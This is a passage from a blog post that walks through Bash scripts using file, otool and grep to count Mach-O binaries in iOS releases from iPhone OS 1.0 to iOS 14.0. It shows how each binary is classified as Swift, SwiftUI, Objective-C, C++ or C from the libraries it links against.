<p>Instead I used the fact that a binary has to be a Mach-O file to be executable. Checking if a file is a Mach-O binary is trivial by using the <code>file</code> command line tool in a Bash script:</p>
<pre><code>#---------------------------------------------------------------------
# Function to check if a file (passed as argument $1) is an executable
# It returns the number of occurrences of the string 'Mach-O' returned by
# the output of the file command. File would generally return a line like
# - Mach-O 64-bit executable arm64e (/usr/bin/sysdiagnose)
# - Mach-O 64-bit dynamically linked shared library arm64e (/usr/lib/libobjc-trampolines.dylib)
# - Mach-O 64-bit bundle arm64e (/usr/lib/xpc/support.bundle/support)
# - Mach-O 64-bit dynamic linker arm64e (/usr/lib/dyld)
# - Mach-O 64-bit kext bundle arm64e (/System/Library/Extensions/AppleIDV.kext/AppleIDV)
# - Mach-O 64-bit dynamically linked shared library stub arm64e (/Applications/FTMInternal-4.app/libMobileGestalt.dylib)
#---------------------------------------------------------------------
isExecutable ()
{
	file $1 2&gt;/dev/null | grep -o "Mach-O" | wc -l
}
</code></pre>
<p>I ran this script through all the files of each major iOS release to count the number of binaries and to obtain the evolution over time:</p>
<p><img src="https://blog.timac.org/2020/1019-evolution-of-the-programming-languages-from-iphone-os-to-ios-14/Binaries.png" alt=""></p>
<p>As you can see, iPhone&nbsp;OS&nbsp;1.0 contained quite a small amount of binaries. But iOS has become more and more complex and iOS&nbsp;14.0 now contains 20 times more binaries than iPhone&nbsp;OS&nbsp;1.0.</p>

<p>In my previous article on <a href="https://blog.timac.org/2020/0927-state-of-swift-ios14/">Apple’s use of Swift and SwiftUI in iOS&nbsp;14</a>, I counted the built-in apps using Swift and SwiftUI. For this article I decided to go one step further and also count the number of binaries using Objective-C, C++ and C.</p>
<p>Keep in mind that you can mix different programming languages to create a binary. One example is to create an app that uses C++ for the low-level engine and Objective-C for the UI. Another good example is <a href="https://apps.apple.com/app/clatters/id1480930237">Clatters</a> where I use some code written in Swift, SwiftUI, Objective-C and C, the most appropriate programming languages being used to solve each specific problem.</p>
<h2 id="detecting-swiftui">Detecting SwiftUI</h2>
<p>In my <a href="https://blog.timac.org/2020/0927-state-of-swift-ios14/">previous post</a>, I explained how to detect if a binary uses SwiftUI by checking if it dynamically links against <code>/System/Library/Frameworks/SwiftUI.framework/Versions/A/SwiftUI</code>. This can be implemented in a Bash script like:</p>
<pre><code>isSwiftUI=$( echo "${otoolOutput}" | grep -o "/System/Library/Frameworks/SwiftUI\.framework/SwiftUI" | wc -l )
</code></pre>
<p>Although SwiftUI is not really a programming language but rather an user interface toolkit, I decided to include it in this article.</p>
<h2 id="detecting-swift">Detecting Swift</h2>
<p>Detecting the use of Swift can be done using a similar method, as <a href="https://blog.timac.org/2016/1101-apples-use-of-swift-in-ios-10-1-and-macos-10-12/">described in an older post in 2016</a>. The script is however slightly more complex due to the fact that the Swift libraries have been moved to different locations during the history of iOS:</p>
<pre><code>isSwift=$( echo "${otoolOutput}" | grep -o "/usr/lib/swift/" | wc -l )

<h2 id="detecting-objective-c">Detecting Objective-C</h2>
<p>Detecting if a binary uses Objective-C is pretty simple as explained in <a href="https://developer.apple.com/documentation/objectivec/objective-c_runtime">Apple's documentation</a>:</p>
<blockquote>
<p>The Objective-C runtime is a runtime library that provides support for the dynamic properties of the Objective-C language, and as such is linked to by all Objective-C apps. Objective-C runtime library support functions are implemented in the shared library found at /usr/lib/libobjc.A.dylib.</p>
</blockquote>
<p>A simple line can thus detect all apps using Objective-C:</p>
<pre><code>isObjectiveC=$( echo "${otoolOutput}" | grep -o "/usr/lib/libobjc\." | wc -l )
</code></pre>
<h2 id="detecting-c">Detecting C++</h2>
<p>Similarly to Objective-C, we can rely on the fact that apps using C++ have to use the C++ standard library. On modern iOS versions, the C++ standard library libc++ is located at <code>/usr/lib/libc++.1.dylib</code>. On iOS&nbsp;7 and earlier, the gcc's libstdc++ was used and located at <code>/usr/lib/libstdc++.6.dylib</code>.</p>
<p>In case you are wondering why the exact path is not used in the script below, the reason is to mark <code>libc++abi.dylib</code> as using C++. <a href="http://libcxxabi.llvm.org/">libc++abi</a> is the low level support for the standard C++ library and appears to be written in C++.</p>
<pre><code>isCPP=$( echo "${otoolOutput}" | grep -o "/usr/lib/libc++" | wc -l )
if [ ${isCPP} == 0 ]
then
	isCPP=$( echo "${otoolOutput}" | grep -o "/usr/lib/libstdc++" | wc -l )
fi
</code></pre>
<h2 id="detecting-c-1">Detecting C</h2>
<p>Without entering into complex details, Objective-C and C++ are a superset of C. This means that an Objective-C or C++ app is using C code. So we can't know if an Objective-C or C++ app is using some pure C code. However some apps are written entirely in C. These are generally low-level command line tool, like <code>/usr/bin/zprint</code>.</p>
<p>How to detect such binaries? If a binary doesn't link neither to the Objective-C runtime library nor to the C++ standard library, but uses the standard C library <code>libc</code> located at <code>/usr/lib/libSystem.B.dylib</code>, then we can assume that this binary is entirely written in C. To detect apps entirely written in C, I ended up with these lines:</p>
<pre><code>isC=$( echo "${otoolOutput}" | grep -o "/usr/lib/libSystem\." | wc -l )
if [ ${isC} == 0 ]
then
	isC=$( echo "${otoolOutput}" | grep -o "/usr/lib/system/" | wc -l )
fi
</code></pre>
<p>You will also notice that I hardcoded all the dynamic libraries located inside <code>/usr/lib/system/</code> as being written in C. These low-level libraries don't link to <code>/usr/lib/libSystem.B.dylib</code> but are most likely written in C.</p>
<h2 id="special-cases">Special cases</h2>
<p>In the final script, you will see a couple of special cases:</p>
<ul>
<li>
<p><code>/usr/lib/libobjc-trampolines.dylib</code>:
This library is entirely written in assembly and you can read its arm64 source code in this file <a href="https://opensource.apple.com/source/objc4/objc4-781/runtime/objc-blocktramps-arm64.s">objc-blocktramps-arm64.s</a></p>
</li>
<li>
<p><code>/usr/lib/dyld</code>:
dyld is the dynamic linker and is a really special binary. Since <a href="https://opensource.apple.com/source/dyld/">it is open source</a>, we can easily confirm that it contains C++ code.</p>
</li>
<li>
<p><code>/System/Library/Caches/com.apple.xpc/sdk.dylib</code> and <code>/System/Library/Caches/com.apple.xpcd/xpcd_cache.dylib</code>:
These 2 libraries seem to be autogenerated libraries and part of dyld.</p>
</li>
<li>
<p><code>/System/Library/Extensions/*</code>:
There are a couple of (kernel?) extension used by iOS like <code>/System/Library/Extensions/AppleIDV.kext</code>. All these binaries appear to use C++.</p>
</li>
</ul>

<p>You can <a href="https://blog.timac.org/2020/1019-evolution-of-the-programming-languages-from-iphone-os-to-ios-14/detectBinaries.sh">download here the complete script</a> that loops through all the files of a folder. This script prints the paths of all the binaries found and tells you the programming languages used, like:</p>
<pre><code>/Applications/AccountAuthenticationDialog.app/AccountAuthenticationDialog |Objective-C
/Applications/ActivityMessagesApp.app/ActivityMessagesApp |Objective-C
/Applications/ActivityMessagesApp.app/PlugIns/ActivityMessagesExtension.appex/ActivityMessagesExtension |Objective-C|Swift
/Applications/AnimojiStickers.app/AnimojiStickers |Objective-C
/Applications/AnimojiStickers.app/PlugIns/AnimojiStickersExtension.appex/AnimojiStickersExtension |Objective-C
/Applications/AppSSOUIService.app/AppSSOUIService |Objective-C
/Applications/AppStore.app/AppStore |Objective-C|Swift
/Applications/AppStore.app/PlugIns/ProductPageExtension.appex/ProductPageExtension |Objective-C|Swift
/Applications/AppStore.app/PlugIns/SubscribePageExtension.appex/SubscribePageExtension |Objective-C|Swift
[...]
</code></pre>

<p>I ran this script on all major releases of iOS from iPhone&nbsp;OS&nbsp;1.0 to iOS&nbsp;14.0. If you are interested by the raw data, you can download them here:</p>
